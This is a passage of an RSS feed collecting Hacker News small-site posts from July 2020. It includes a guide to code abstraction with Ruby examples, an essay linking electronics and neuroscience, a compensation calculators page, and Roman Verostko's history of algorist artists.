          <li>Any correspondence with participant will be done through an email provided by the participant at time of filling the application form. Organizers are not liable in case of email delivery failures.</li>
          <li>For any queries, please send mail at: <a href="mailto:connect@mygov.nic.in">connect@mygov.nic.in</a></li>
        </ul>
     
		<h3>DISCLAIMER</h3>
			<p>MeitY reserves the right, at its sole discretion, to cancel, terminate, suspend this contest and modify the rules, prizes &amp; funding related to the contest without prior notice. In no event shall  MeitY/Digital India/MyGov/NIC or any other organizers be liable for any claims, losses, expenses or damages, arising out of or in connection with the foregoing.</p>
		</div>
   
    
      
      
      
       
    </div>
  </div>
</div></div>]]>
            </description>
            <link>https://innovate.mygov.in/app-challenge/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23736349</guid>
            <pubDate>Sun, 05 Jul 2020 03:15:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Beginner's Guide to Abstraction]]>
            </title>
            <description>
<![CDATA[
Score 237 | Comments 79 (<a href="https://news.ycombinator.com/item?id=23735991">thread link</a>) | @jesseduffield
<br/>
July 4, 2020 | https://jesseduffield.com/beginners-guide-to-abstraction/ | <a href="https://web.archive.org/web/*/https://jesseduffield.com/beginners-guide-to-abstraction/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-75">
	<!-- .entry-header -->

	
	
	<div>
		<p>In <em>The Pragmatic Programmer</em>, Andrew Hunt and David Thomas introduced the DRY (Don't Repeat Yourself) principle. The rationale being that if you see the same code copy+pasted 10 times you should probably factor that code into its own method/class.</p>
<p>But then Sandi Metz came along and <a href="https://www.sandimetz.com/blog/2016/1/20/the-wrong-abstraction">said</a>:</p>
<blockquote>
<p>Duplication is far cheaper than the wrong abstraction.</p>
</blockquote>
<p>And so the eternal war began.</p>
<h3>What is abstraction?</h3>
<p>For the purposes of this post I'm referring to the kind of abstraction as described in the <a href="https://en.wikipedia.org/wiki/Abstraction_(computer_science)#Abstraction_in_object_oriented_programming">Abstraction Principle</a>, which Wikipedia describes like so:</p>
<blockquote>
<p>In software engineering and programming language theory, the abstraction principle (or the principle of abstraction) is a basic dictum that aims to reduce duplication of information in a program (usually with emphasis on code duplication) whenever practical by making use of abstractions provided by the programming language or software libraries</p>
</blockquote>
<p>This post has nothing to say about the conceptual kind of abstraction where from the concrete examples of 'Parrot' and 'Sparrow' you create an abstraction of 'Bird'. This post is about duplicated code, how to respond to it, and how to respond to other people's responses to it.</p>
<p>I define the verb 'abstraction' to be an <em>attempt</em> to reduce complexity by combining repeated commonality into some generalisation. And so, the noun 'abstraction' is the result of that attempt. If you're somebody who believes abstraction is by definition a <em>successful</em> attempt, feel free to substitute the term 'wrong abstraction' with 'failure to abstract' throughout this post.</p>
<p>The process of abstraction typically goes like this:<br>
1) you identify different chunks of code that you think are all essentially doing the same thing<br>
2) you create a method or a class with a narrow interface which can be substituted in for all the chunks of code you found<br>
3) you go and swap out the chunks of code with a call to your method/class</p>
<h3>Abstraction is always a gamble</h3>
<p>In the world of software engineering, when requirements are always changing, every abstraction is a gamble. When you make an abstraction over some concrete things, you're making a bet that the concrete things are more similar than they are different, and that their similarities are not mere coincidences: that there is a common purpose shared by the concrete things which would lead them to evolve in lockstep as requirements evolve. If you win the bet, your codebase will be easier to work in and adding new use cases via your abstraction will be trivially easy. If you lose, you'll see a flash of fear in your colleague's eyes whenever they're assigned a ticket to make yet another extension to the misfigured monster that the once-innocent abstraction has now become</p>
<p>But risk abounds everywhere, and leaving duplicated code unabstracted is its own gamble. You're betting that the chunks of code will evolve in separate directions as requirements change and that their current similarities are more coincidence than a reflection of their common purpose. Win the bet and your colleague gets to sleep soundly at night knowing they won't be facing the abstraction monster at work the next day. Lose, and code that should have evolved in lockstep is now implemented in completely different ways across different files, where a developer fixes a bug identified in one place, only for the same bug to be reported days later in a completely different file.</p>
<p>Your job is to get good at making the right bets.</p>
<h3>The right/wrong abstraction</h3>
<p>You'll know that you've made the <em>right</em> abstraction when a long time passes and you haven't needed to expand the interface (an example of expanding the interface is adding an optional flag argument). You'll also know you've made the right abstraction when another developer doesn't find it that much harder to understand how the code behaves for a given use case than if somebody had written the code to satisfy the use case without the abstraction.</p>
<p>You'll know you've made the <em>wrong</em> abstraction when after a while the interface has been expanded to support various optional flags, each for a different use case, and you need to be a genius to reason about what the code will actually do for a given use case. By the way, if you have a string arg that merely gets fed into a switch statement inside a method and for each new use case you come up with a new accepted value for it, you <em>are</em> expanding the implicit interface, even if that fact isn't captured in your type system.</p>
<p>There is plenty of daylight between the perfect abstraction and the completely wrong abstraction (perhaps the interface needs to be fundamentally changed but afterwards you're back to having a good abstraction), and so the point of this section isn't to prescribe how much you should be abstracting, but to encourage you to think about both perspectives and be able to make a case in a PR review for why you think an abstraction should/should-not exist.</p>
<h3>Do you over or under-abstract?</h3>
<p>Given it is impossible to make the right decision with regards to abstraction every time, you are probably either somebody who over-abstracts or somebody who under-abstracts.</p>
<p>If common feedback on your PR reviews is that you should DRY up your code, you could probably benefit from doing a scan for duplicated code before submitting a PR and considering whether it belongs in its own method/class.</p>
<p>If you commonly get feedback that your methods are hard to understand because they support too many disparate use cases at once, you are probaby over-abstracting and should consider whether you should increase your tolerance for duplication.</p>
<p>Note that it's not always as simple as under-abstracting vs over-abstracting. Sometimes abstraction is appropriate, but you might take the wrong approach. If an abstraction is deemed wrong by the team, that doesn't mean no abstraction is necessarily the best alternative.</p>
<h3>Under-abstraction examples</h3>
<p>The main sign that you could be under-abstracting is that you have a heap of code doing the exact same thing called in a heap of places with no obvious reason why anybody would want the code to diverge.</p>
<h4>Example: Hard-coded formulas</h4>
<h5>Bad:</h5>
<pre><code># sphere has radius of 11
sphere_volume = 4*Math::PI/3*11**3
puts "the volume of the sphere is #{sphere_volume} cm^3"
...

radius = calculate_radius
volume = 4*Math::PI/3*radius**3
sphere.volume = volume</code></pre>
<h5>Good:</h5>
<pre><code>def sphere_volume(radius)
  4*Math::PI/3*radius**3
end

# sphere has radius of 11
sphere_volume = sphere_volume(11)
puts "the volume of the sphere is #{sphere_volume} cm^3"
...

radius = calculate_radius
volume = sphere_volume(radius)
sphere.volume = volume</code></pre>
<p>Why is it a good idea to abstract the formula for a sphere's volume into its own method? Because if mathematicians ever found out they got the formula wrong, you would want to go through all the places in your code that you used the formula and update it to be correct. That is, we know ahead of time that we want the code to be in lockstep. This is as safe a gamble as you can get.</p>
<h3>Over-abstraction examples</h3>
<p>The main sign that you're over-abstracting is that your method accepts a bunch of optional args:</p>
<h4>Example: Bloated method</h4>
<h5>Bad:</h5>
<pre><code>def average(arr, type = Integer, ignore_nulls = false)
  if arr.any?(&amp;:nil?)
    if ignore_nulls
      arr = arr.compact
    else
      return nil
    end
  end

  if type == String
    arr = arr.map(&amp;:to_i)
  end

  arr.sum / arr.size
end

puts average([1,2,3])
=&gt; 2

puts average(['1','2','3'], String)
=&gt; 2

puts average(['1','2','3', nil], String, true)
=&gt; 2

puts average([1, 2, 3, nil], Integer, false)
=&gt; nil</code></pre>
<p>If you want to know how the <code>average</code> method behaves when you're dealing with an array of strings with no <code>nil</code> values, you have to read through the first if condition which has nothing to do with your use case before reaching the code that does. Likewise if you want to know how the <code>average</code> method behaves when the array contains either nils or integers, the second if condition is irrelevant, but you'll still need to read through that to understand how the whole thing works.</p>
<p>If each of the use cases came up dozens or hundreds of times, maybe then it would make sense to retain the abstraction, but when the number of optional arguments is roughly equal to the number of different use cases, chances are you've got the wrong abstraction.</p>
<h5>Good:</h5>
<pre><code>def average(arr)
  arr.sum / arr.size
end

puts average([1,2,3])
=&gt; 2

arr = ['1','2','3'].map(&amp;:to_i)
puts average(arr)
=&gt; 2

arr = ['1','2','3', nil].compact.map(&amp;:to_i)
puts average(arr)
=&gt; 2

arr = [1, 2, 3, nil]
if arr.any?(&amp;:nil?)
  puts nil
else
  puts average(arr)
end
=&gt; nil</code></pre>
<p>In this case we're not removing the abstraction altogether: we're just keeping the part that actually applies to all cases. Now understanding the logic of any one invocation of our <code>average</code> method is trivial.</p>
<p>We now have <code>.map(&amp;:to_i)</code> being duplicated whereas it only appeared once in the <code>Bad</code> alternative, but it's a small cost for a vast improvement.</p>
<p>Note that looking at the <code>Good</code> variant, it's clear that the behaviour is quite different from one use case to the next, but that is not at all clear in the <code>Bad</code> variant because the method calls all look so simple and it was anybody's guess how much code inside <code>average</code> applied to each use case.</p>
<p>This is why abstractions go bad over time: because as you expand the interface more and more, it becomes harder and harder to judge how appropriate the abstraction is to any given use case, and developers end up assuming that all that convoluted code is vaguely relevant to the majority of use cases when in fact it's not.</p>
<h4>Example: Awkward class</h4>
<h5>Bad:</h5>
<pre><code>class Shape
  def initialize(radius: nil, width: nil, type:)
    @radius = radius
    @width = width
    @type = type
  end

  def area
    case @type
    when :square
      @width ** 2
    when :circle
      (@radius ** 2) * Math::PI
    end
  end

  def perimeter
    case @type
    when :square
      @width * 4
    when :circle
      @radius * 2 * Math::PI
    end
  end

  def diameter
    case @type
    when :square
      nil
    when :circle
 …</code></pre></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jesseduffield.com/beginners-guide-to-abstraction/">https://jesseduffield.com/beginners-guide-to-abstraction/</a></em></p>]]>
            </description>
            <link>https://jesseduffield.com/beginners-guide-to-abstraction/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23735991</guid>
            <pubDate>Sun, 05 Jul 2020 01:12:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What I Discovered When Studying Neuroscience Having a Background in Electronics]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23735671">thread link</a>) | @recknsense
<br/>
July 4, 2020 | https://recknsense.com/what-i-discovered-when-studying-neuroscience-and-having-a-background-in-electronics/ | <a href="https://web.archive.org/web/*/https://recknsense.com/what-i-discovered-when-studying-neuroscience-and-having-a-background-in-electronics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-id="9f5ead6" data-element_type="widget" data-widget_type="theme-post-content.default">
				<div>
			<p><span>I’m interested in the the way the brain works. </span></p>
<p><span>I have been from as far back as I remember. I naturally gravitated towards the </span><span><a href="https://en.wikipedia.org/wiki/Neuroscience">neuroscience</a></span><span> section without realizing what it was or why I was found myself there. I suspect it’s the combination of the study of the brain’s mysterious inner workings combined with a scientific methodology. I’ve casually dipped into Psychology and Behavior but it didn’t have the logic and neat explanations that I was used to in the sciences. I originally studied Electronic Engineering years ago, then coding and the design of technical solutions. I never considered how my knowledge of electronics could map to neuroscience but it turned out it does, quite nicely. In Electronics you learn the fundamentals of building small devices like current, resistance, voltage, and capacitance. This knowledge allows you to invent new machines or software. In Neuroscience you have those same principles but current is the flow of ions, voltage is in micro sizes and capacitance and resistance depend of the biology of our bodies. It’s the study of the ultimate machine – the human.</span></p>
<h4>The Human Body is the Best of Machines</h4>
<p><span>I signed up to the </span><span><a href="https://courses.edx.org/courses/course-v1:HarvardX+MCB80.1x+2T2020/course/">Harvard EdX – Fundamentals of Neuroscience Part 1</a></span><span> course. It’s free course but you can pay a small fee at the end for the certificate.</span><span><span>&nbsp; </span></span><span>The mathematical formulas got my brain grinding again, I felt a pang of nostalgia as I started plugging numbers into equations. In neuroscience you have to worry about a lot more than the physical mechanics. You’re dealing with liquid solutions that contain ions like Sodium or Potassium that surround the machinery and the complex arrangement of cells and their membranes. I noticed there was a shift from absolutes to probabilities. You can only be a percentage level sure that an action by a neuron would happen. In electronics we usually know for certain if all other parameters are constant. In the study of neuroscience I felt like I was discovering the blueprint of an impossibly complicated design of a machine. In electronics, I was learning about small building blocks that I could use to design new machines. It was humbling. </span></p>
<p><span>I would recommend the course if you have a physics or electronics background. For one, you’ll find it easy to understand the concepts. Two, you’ll be in awe of the way the human body works. And three, you will have a new understanding and appreciation of occasions where the body fails to work as intended e.g. </span><span><a href="https://www.nationalmssociety.org/What-is-MS">Multiple Sclerosis</a></span><span> which occurs when certain elements are damaged leading to the debilitating symptoms in the nerves.</span></p>
<h4>The Advances of Electronics + Neuroscience</h4>
<p><span>The intersection of electronics and neuroscience is not new but over recent years, advances in both fields have opened the door to some intriguing research. For example I came across </span><span><a href="https://www.tandfonline.com/doi/full/10.1080/23746149.2019.1664319">this research from last year on flexible electronics that can enable new types of neural implants to restore function in the human body</a></span><span>. Another </span><span><a href="https://theconversation.com/to-understand-the-brain-you-need-electronic-engineers-too-26104">article, although several years old now, puts forward the case for more electronic engineers in the field of neuroscience</a></span><span> to help make new discoveries in brain disorders and artificial intelligence. In particular, the idea of mimicking the design of real neuron behavior and applying that to the electronic circuits that power our devices. I recently read a book about patterns in nature that are remarkably similar throughout disciplines </span><span><a href="https://recknsense.com/natures-deep-design-of-the-mind/">‘A Beautiful Question: Finding Nature’s Deep Design’ by Frank Wilczek</a></span><span>. In the book, the author points out that many discoveries shared striking patterns of symmetry and balance. It stands to reason that the patterns we can identify in a human intelligent machine could lead us to design better machines – even if we don’t understand exactly how they work. Unlike our digital functioning machines, the patterns in neuroscience are analogue and less predictable. With our deeper understanding of quantum mechanics we are finding out that at a tiny, quantum level, the patterns are also less based on digital 1’s and 0’s. Somewhere, these two disciples should inevitably meet with the net effect of improving both.</span></p>
<p><span>Recently there has been some very exciting research that shows signs of doing that, specifically to improve the design of electronic devices. </span><span><a href="https://www.sciencedaily.com/releases/2020/04/200420084249.htm">The University of Massachusetts Amherst published a paper in April 2020 that explains the discovery of miniature tools (memristors) that operate like real brain synapses</a></span><span>. In this way the electronics mimic the human brain in efficient learning by being able to operate at very small voltage levels, much like the brain itself. This low power efficiency can open the doors for many possibilities including the notion that one day we could invent devices that ‘speak to’ real human neurons.</span></p>
<h4>The Future is Neuromorphic</h4>
<p><span>The study of mimicking brain neurons is called ‘</span><span><a href="https://en.wikipedia.org/wiki/Neuromorphic_engineering">Neuromorphic engineering</a></span><span>’ and is a pioneering field. You can read more about it here and find out why it is likely to trigger a revolution in engineering. This informative article goes into more detail on the analog nature of Neuromorphic engineering and the world changing applications that could be developed as a result. It also goes into a lot more detail on the technology.</span></p>
<p><span>The fundamentals of neuroscience course I took gave me a great introduction to a new field of study. But it also gave me an opportunity to refresh on some old knowledge while learning something new and to consider what this new combination of technologies could offer for the future. The real excitement though is the idea of taking the examples we discover within ourselves and using this as a guide to develop groundbreaking new technologies that could change everything. </span></p>
<p>If you share the same interests humans and technology, please check out the <a href="https://recknsense.com/recknwho/">‘Find Who’</a> section of Recknsense where I post about what I’ve read, watched and want to know about. There you can respond by telling me who you are and how to connect to you.</p>
		</div>
				</div></div>]]>
            </description>
            <link>https://recknsense.com/what-i-discovered-when-studying-neuroscience-and-having-a-background-in-electronics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23735671</guid>
            <pubDate>Sat, 04 Jul 2020 23:43:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: FAANG Compensation Calculators]]>
            </title>
            <description>
<![CDATA[
Score 27 | Comments 11 (<a href="https://news.ycombinator.com/item?id=23735469">thread link</a>) | @refrigerator
<br/>
July 4, 2020 | https://mackgrenfell.com/compensation-calculators/facebook | <a href="https://web.archive.org/web/*/https://mackgrenfell.com/compensation-calculators/facebook">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>These calculators show what you can expect to earn at different tech companies, accounting for career progression. </p><p>Data from <a href="https://levels.fyi/" target="_blank">levels.fyi</a>. Models built in <a href="https://causal.app/?utm_source=compensation_calculators" target="_blank">Causal</a>. Special thanks to <a href="https://twitter.com/miraan_tabrez" target="_blank">Miraan</a>.</p></div></div>]]>
            </description>
            <link>https://mackgrenfell.com/compensation-calculators/facebook</link>
            <guid isPermaLink="false">hacker-news-small-sites-23735469</guid>
            <pubDate>Sat, 04 Jul 2020 22:56:21 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Algorists]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23735302">thread link</a>) | @davidhariri
<br/>
July 4, 2020 | http://www.verostko.com/algorist.html | <a href="https://web.archive.org/web/*/http://www.verostko.com/algorist.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
	<p><span size="2" face="Arial"><a href="http://www.verostko.com/menu.html">
	<span>verostko main menu</span></a>&nbsp; |&nbsp;
	<a href="http://www.verostko.com/contact.html">
	<span>contact</span></a> |
	<a href="http://www.verostko.com/copyright.html"><span>copyright</span></a></span><span size="2">&nbsp;|
	</span><span face="Arial" size="2"><a href="http://www.verostko.com/index.html">
	<span>home</span></a></span><a href="http://www.verostko.com/index.html"><span size="1" face="Arial"><span>&nbsp;&nbsp;&nbsp;</span></span></a><span size="1" face="Arial">&nbsp;&nbsp;&nbsp;&nbsp;</span></p>
	<p><span size="6">THE ALGORISTS</span><span size="4"> by Roman Verostko</span><b>
	</b></p>
	<table>
		<tbody><tr>
			<td><a href="http://www.verostko.com/algorists/hebert/hebert-chicago.html">
			<img src="http://www.verostko.com/algorists/hebert/chicago%20SIGGRAPH-w.jpg" width="537" height="406"></a></td>
			<td><b><span face="Arial" size="1">Jean-Pierre Hébert</span></b><p>
			<span face="Arial" size="1"><i>Chicago, 1992, <br>
			</i>sienna natural and cobalt blue;<br>
			pen and inks on technical paper. </span></p>
			<p><i>
			<span face="Arial" size="1">© j.p.hebert</span></i></p></td>
		</tr>
	</tbody></table>
	<p>Often I am asked "Who are the algorists?<span size="3">"
		</span><span face="Times New Roman">&nbsp;</span>Simply put a<span size="3">n 
	algorist is anyone who works with algorithms.&nbsp; Historically we have 
	viewed algorists as mathematicians.&nbsp; But it also applies to artists who 
	create art using algorithmic procedures 
		that include their own algorithms.&nbsp;&nbsp;</span><span face="Times New Roman">This 
	page presents an account of the adaptation of this term by a group 
	of artists in 1995.&nbsp; Algorithmic art has a deep history that reaches 
	back to prehistoric art. But the advent of computing power spawned an 
	artistic practice with form-generating features that is relatively unique to 
	the last quarter of the 20th Century. Computer power gives the artist's 
	algorithms a leverage we might liken to the power of the engine in the 
	industrial revolution.&nbsp; In 1969, when I first tasted algorithmic 
	leverage, I set out to learn how to use it as an artist. </span></p>
	<table>
		<tbody><tr>
			<td>
			<img src="http://www.verostko.com/algorists/hebert/veros-hebert-11-sntsbarb-i.jpg" width="656" height="353"></td>
			<td>
			&nbsp;</td>
		</tr>
		<tr>
			<td colspan="2"><span face="Arial" size="1">Roman Verostko (left) and Jean Pierre 
			Hebert (right), 2011, Santa Barbara. In 1995, Jean-Pierre suggested that we adapt&nbsp; 
			the term&nbsp; algorist&nbsp; for our identity. He also wrote the algorithm 
			defining "algorist" that is now viewed as an "<b>algorist 
			manifesto</b>" . </span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </td>
		</tr>
	</tbody></table>
	<p>I met other artists following the same path who were interested in an 
	identity for their algorithmic art practice. It was Jean Pierre Hebert (JPH) who suggested we adopt 
	the term "algorist" and he also wrote the algorithm for an <i>algorist.&nbsp; </i>This algorithm is now viewed as the "<i>algorist manifesto</i>"<i> </i>
	and it was JPH who led discussions and correspondence in establishing its 
	usage. <i>&nbsp;</i>While the practice of algorithmic art reaches back to 
	pre-historic basket-weaving and tool-making the implementation with 
	computing power provided new "form-generating" capabilities.</p>
	<p>Although adapted in 1995 the term applies to work by colleagues that date 
	back to the 1960's and even earlier. <span face="Times New Roman">
	<span>&nbsp;With the rise of ubiquitous 
	computing algorithmic art now ranges&nbsp; from games and interfaces 
	with biological life to experiments with the evolution of form and social 
	consciousness.</span> </span> </p>
	<p><span face="Times New Roman" size="4">The term "<i>algorithm</i>"</span></p>
		<p><span size="3">The term <i>algorithm</i> is an 
		alternative spelling for the term "<i>algorism</i>". Thus a person who 
		works with&nbsp; algorisms (or algorithms) is an <i>algorist</i>.&nbsp; 
		Traditionally the term algorist is associated with mathematicians. An algorithm refers 
		primarily to the step by step mathematical procedure for 
		carrying out a specific calculating task (see </span><i>
		<span size="2" face="Arial">
		<b>
		<a title="click here for more info on this " href="#Note_1">note 
		1</a></b>)</span></i><span size="3">. 
		With the advent of computers we find ourselves writing procedures that 
		reach beyond solving mathematical problems. </span>The detailed instruction directing a 
		drawing machine on how to draw a visual form is also an algorithm.<span size="3">&nbsp;
		</span>Today, more broadly, a composer's score for musical form and a 
		choreographer's notations for dance may also be viewed as algorithms. 
		Such notations, similar to computer software formats, are detailed 
		procedures for carrying out a task.&nbsp;From this perspective we could 
		also view the recipe for baking a cake as an algorithm.</p>
		<table id="table61">
			<tbody><tr>
				<td><a href="http://www.verostko.com/algorists/images/music17-w.jpg">
				<img src="http://www.verostko.com/algorists/images/music17-wi.jpg" width="670" height="250"></a></td>
			</tr>
			<tr>
				<td><span face="Arial" size="1"><br>This Seventeenth 
				Century keyboard music, is thought to be in the hand of the 
				great keyboard composer, Girolamo Frescobaldi (1583-1643). The 
				Vatican folios shown (23 &amp; 24)&nbsp; display the opening from 
				his Fourth Toccata. The score may be viewed as an algorithm, 
				expressive both in structure and in the writing hand of the 
				composer.&nbsp; <i>© Vatican Library MS: Chig. Q. IV 29 fols. 
				23 verso-24 recto music17 NB.40.&nbsp; </i>Image source: </span>
				<a href="http://www.ibiblio.org/">
				<span size="1" face="Arial" color="#000000">
				http://www.ibiblio.org/</span></a><span size="1" face="Arial">expo/vatican.exhibit</span></td>
			</tr>
		</tbody></table>
		<p><span>Algorithmic art may be found throughout history, from prehistoric 
		basket weaving to geometric and conceptual art in the 20th Century. 
		However,&nbsp; the advent of computers provide us with form-generating 
		leverage that, to the best of my knowledge, has no precedent in&nbsp; 
		the history of art. It is in&nbsp; this sense that algorist artists of 
		the late 20th Century pioneered procedures that have come to permeate 
		the visual and sound arts in&nbsp; the 21st Century.</span></p>
	<div>
		
		<p><span size="3"><span>In the latter 
		half of the 20th Century, with the growth in information science and 
		digital technologies the use of&nbsp; algorithmic procedure spread far 
		beyond the dreams of its earliest practitioners. We&nbsp; have, among 
		the living in 2012, a number of&nbsp; algorists whose vision and work with programming&nbsp; pointed 
		the way that permeates the world of&nbsp; art today.&nbsp;</span>Pictured above,<i> 
		in a single frame,&nbsp; </i>are four algorists who were present in the context of a display of&nbsp; 
		digital pioneer works at the Victoria &amp; Albert in London, 2010.&nbsp;A 
		retrospective of&nbsp; the pioneer work of Hiroshi&nbsp; Kawano, 
		pictured above, was presented at the ZKM in Karlsruhe, Germany, in 
		2011-12 before he died.&nbsp;&nbsp; </span>While not present for the photo above, celebrated pioneers like 
		Herbert Franke, Vera Molnar, Charles Csuri, and Harold Cohen (shown 
		below), were 
		also represented in the <a name="eight"> <i>Digital Pioneers</i></a> V&amp;A 
		display <span face="Arial" size="2"><a href="#Note_8._"><i>(Note 8.)</i></a></span> 
		.&nbsp;&nbsp; Other important contributors to the pioneers showing, not 
		pictured here, included&nbsp; George Nees and Edward Zajec.&nbsp; </p>
		
		<p><span size="4">Historic Notes: Writing the score for drawing.</span></p>
		<p>In the last quarter of the 20th Century I was one of a 
		like minded group of artists who undertook to write instructions for 
		executing our art.&nbsp; In the 1970's &amp; 80's&nbsp; "Computer art" was the term 
		generally applied to all art associated with computers.&nbsp; Some of us had been working with 
		algorithmic procedure for about a quarter century before our 1995 
		declaration as "algorists".&nbsp; The 1995 manifesto of the "algorists" 
		was not a declaration of something new; rather, it was giving identity 
		to an artistic practice that had already brought radical change and 
		would continue to change the way we would create art in&nbsp; the 21st 
		Century.&nbsp;The algorist adaptation provided a name for artists who 
		practiced algorithmic art.&nbsp; This practice also had a valuable presence in sculpture 
		and music. Helaman Ferguson would be a sculptor whose algorithmic art&nbsp; 
		celebrated an aesthetic rooted in mathematics.&nbsp; His "Four Canoes", 
		shown below, is an excellent example with links to information on the 
		procedure for achieving the form of the tori, the pedestal, and the 
		platform. </p> 
		<table>
			<tbody><tr>
				<td>
				<p><span size="1" face="ADMUI3Sm">
				<a href="http://www.verostko.com/algorists/ferguson/HF-4-canoes-w.jpg">
				<img src="http://www.verostko.com/algorists/ferguson/HF-4-canoes-wi.jpg" width="417" height="328"></a></span></p></td>
				<td><b><a name="four canoes2">
				<span face="Arial" size="1">Helaman Ferguson</span></a></b><p>
				<span face="Arial"><span size="1">"Four Canoes",  
				1997,&nbsp;University of St Thomas Science and Engineering Center, 
				St. Paul, MN, USA. This impressive algorithmic presence features 
				two interlocked six foot granite tori mounted on a platform 
				created with hexagonal tiling.&nbsp;</span></span></p><p>
				<span size="1" face="Arial">&nbsp;<a href="#Note_6">Note 6 </a></span>
				</p><p>
				<span face="Arial"><span size="1">See also:</span> </span>
				<span face="Arial" size="1">
				<a href="http://scgp.stonybrook.edu/archives/4387">&nbsp;UmbilicTorus 
				at Stonybrook</a></span></p></td>
			</tr>
		</tbody></table>
		<p>Yet algorithmic art should not be confused with the practice of 
		mathematics. The process of writing the score for a drawing requires 
		poetic engagement similar to that required for composing the score for 
		music.&nbsp; 
		Algorithmic drawings, like my "Green Cloud" shown below, evolved from my 
		passion, as a painter, for the marriage of spontaneous brushwork and 
		studied arrangement.&nbsp; With elementary programming abilities I 
		explored the same goals I had set for myself as a painter.&nbsp; Clearly 
		programming and mathematics do not create art.&nbsp; Programming is a 
		tool that serves the vision and passion of the artist who creates 
		the procedure.</p>
		<table id="table53">
			<tbody><tr>
				<td>
				<a title="click for larger image." href="http://www.verostko.com/algorists/roman/green-cloud-w2.jpg">
				<img src="http://www.verostko.com/algorists/roman/green-cloud-w2-i.jpg" width="378" height="293"></a></td>
				<td bordercolor="#000000">
				<p>
				<a title="click for drawing machine videos" href="http://www.verostko.com/shows/n-spark/n-spark.html">
				<img src="http://www.verostko.com/algorists/roman/3-story%20drwg%20mach-b.jpg" width="390" height="299"></a></p>
				</td>
			</tr>
			<tr>
				<td><b><i><span face="Arial" size="1">
				<a href="http://www.verostko.com/algorists/roman/green-cloud-w2.jpg">
				*</a></span></i></b><span size="1" face="Arial"><i><b><a href="http://www.verostko.com/algorists/roman/green-cloud-w2.jpg">Green 
				Cloud (the drawing)</a>" </b></i><b>by Roman Verostko.&nbsp; </b>
				Pen &amp; ink plotter drawing. Drawing process presented as a Three 
				Story Drawing Machine, June 2011 at the Minneapolis College of 
				Art &amp; Design (MCAD).</span></td>
				<td><span size="1" face="Arial"><i>
				<a href="http://www.verostko.com/shows/n-spark/n-spark.html">
				Three Story Drawing Machine</a>, north wall, MCAD,&nbsp; 
				Northern 
				Spark, "White Night", ca. 4:30 AM, June 5, 2011, nearing the end 
				of an 8 hour, all night drawing session.</i></span></td>
			</tr>
		</tbody></table></div>
	<p>LOOKING BACK</p><p>Before looking back&nbsp; let me note 
	that several pioneer algorists have carried their form explorations well 
	into the 21st Century. Of these<span size="3"> Manfred Mohr&nbsp;and Harold 
	Cohen 
	stand out as two of those master pioneers who were the first to achieve 
	mature algorithmic styles.&nbsp; Manfred's&nbsp; "<a href="http://www.emohr.com/ww4_out.html">Klangfarben</a>" 
	series&nbsp; demonstrates </span><span face="Times New Roman">the power of 
	algorithmic procedure in the hands of a master. </span><span size="3">
	Manfred has labored for over 40 years creating visual tension fields as an 
	art of pure visual form. In this series we experience algorithmic form 
	generation in real time.<br>
&nbsp;</span>
	</p><p><span size="3">&nbsp;"Aaron", a personification of Harold 
	Cohen's software, represents over 30 years of work on creating an intelligent 
	artist.&nbsp; Aaron's drawings and paintings,&nbsp; grew from Harold's 
	earlier experience as a painter. Consequently "Aaron's" code&nbsp; appears 
	to yield a mysterious relationship to Harold as the artist-painter in his 
	earlier years.&nbsp; </span></p><p><span size="3"><i>Historically 
	how did we get here?</i></span><span face="Times New Roman">
	</span>
	</p><p><span size="3">In the earlier days of computing there were 
	no software tools for artists. Frieder Nake told me how he came upon the 
	task of writing software for a drawing machine at the University of 
	Stuttgart in 1963.&nbsp; The company did not supply software with the 
	machine and he was assigned the task.&nbsp; During the&nbsp; 1960's&nbsp; 
	several artists like 
	Manfred Mohr and Hiroshi Kawano saw the "form-generating" power of computers 
	as an opportunity for art.&nbsp;Hiroshi Kawano had hoped to gain insight 
	into the logic underlying our creative process.&nbsp; Software and technical procedures for visualization 
	grew hand in hand with hardware. Artists engaging new computing and 
	visualizing technologies had to either collaborate with engineers for 
	programming their ideas or else create their own programs (algorithms).</span><span size="1" face="Arial">&nbsp;
	<br>&nbsp;</span><table>
		<tbody><tr>
			<td><a href="http://www.verostko.com/algorists/mohr/p021a-mohr.html">
			<img src="http://www.verostko.com/algorists/mohr/p021a[1].gif" width="252" height="256"></a><p>
			<a href="http://www.verostko.com/algorists/images/p702fw.gif">
			<img src="http://www.verostko.com/algorists/images/p702fi.gif" width="250" height="203"></a></p></td>
			<td><span face="Arial" size="1">Manfred Mohr, New York<p>
			<a href="http://www.verostko.com/algorists/mohr/p021a-mohr.html">P-021/A, 
			"band-structure",</a> ink/paper, 1969, 50cm x 50cm<br>Early plotter 
			drawing in a series achieved with algorithmic procedures that 
			included rules he viewed as&nbsp;&nbsp; </p></span>
			<span>
			<span size="1">"aesthetical-filters"</span></span>
			
			<p><span face="Arial" size="1"><p>
			<a href="http://www.verostko.com/algorists/images/p702fw.gif">P702F</a>, Endurachrome, 2000. 
	…</p></span></p></td></tr></tbody></table></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://www.verostko.com/algorist.html">http://www.verostko.com/algorist.html</a></em></p>]]>
            </description>
            <link>http://www.verostko.com/algorist.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23735302</guid>
